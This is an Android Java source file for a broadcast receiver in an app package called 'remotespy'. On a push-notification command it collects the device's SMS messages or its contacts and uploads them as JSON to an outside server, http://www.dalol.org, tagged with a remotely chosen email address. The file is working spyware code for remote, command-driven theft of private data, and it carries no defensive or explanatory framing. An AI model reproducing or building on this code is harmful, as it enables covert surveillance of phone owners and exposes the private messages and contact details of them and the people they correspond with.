package org.dalol.remotespy.receiver;

import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.support.v4.content.WakefulBroadcastReceiver;
import android.widget.Toast;

import com.google.gson.Gson;

import org.dalol.remotespy.ApiResponse;
import org.dalol.remotespy.CollectApi;
import org.dalol.remotespy.ContacT;
import org.dalol.remotespy.MessagesHelper;
import org.dalol.remotespy.Sms;

import java.util.ArrayList;
import java.util.List;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

/**
 * @author Filippo Engidashet [filippo.eng@gmail.com]
 * @version 1.0.0
 * @since Sunday, 25/03/2018 at 15:42.
 */

public class GcmBroadcastReceiver extends WakefulBroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle data = intent.getExtras();
        if (data != null) {
            System.out.println("FLIPPO -> " + data.toString());

            String body = data.getString("gcm.notification.body");
            if (body != null) {
                if (body.length() > 2) {
                    String[] split = body.split(",");
                    if ("msg".equals(split[0])) {
                        ArrayList<Sms> allSms = new MessagesHelper().getAllSms(context);
                        sendToServer(context, allSms, split[1], split[2]);
                    } else {
                        List<ContacT> contacTS = new MessagesHelper().fetchContacts(context);
                        sendToServer(context, contacTS, split[1], split[2]);
                    }
                }
            }
        }

        Toast.makeText(context, "Received something", Toast.LENGTH_SHORT).show();
//        ComponentName comp = new ComponentName(context.getPackageName(), PushReceiverIntentService.class.getName());
//        startWakefulService(context, (intent.setComponent(comp)));
//        setResultCode(Activity.RESULT_OK);
    }

    private void sendToServer(final Context context, Object o, String subject, final String email) {
        try {
            Retrofit retrofit = new Retrofit.Builder()
                    .baseUrl("http://www.dalol.org")
                    .addConverterFactory(GsonConverterFactory.create())
                    .build();

            CollectApi collectApi = retrofit.create(CollectApi.class);
            Call<ApiResponse> call = collectApi.sendData(email, subject, new Gson().toJson(o));
            call.enqueue(new Callback<ApiResponse>() {
                @Override
                public void onResponse(Call<ApiResponse> call, Response<ApiResponse> response) {
                    if (response.isSuccessful()) {
                        ApiResponse apiResponse = response.body();
                        if (apiResponse != null) {
                            Toast.makeText(context, apiResponse.getMessage(), Toast.LENGTH_SHORT).show();
                        } else {
                            Toast.makeText(context, response.message(), Toast.LENGTH_SHORT).show();
                        }
                    } else {
                        Toast.makeText(context, response.message(), Toast.LENGTH_SHORT).show();
                    }
                }

                @Override
                public void onFailure(Call<ApiResponse> call, Throwable t) {
                    Toast.makeText(context, t.getMessage(), Toast.LENGTH_SHORT).show();
                }
            });

        } catch (Exception e) {
            System.err.println(e.getMessage());
        }
    }
}
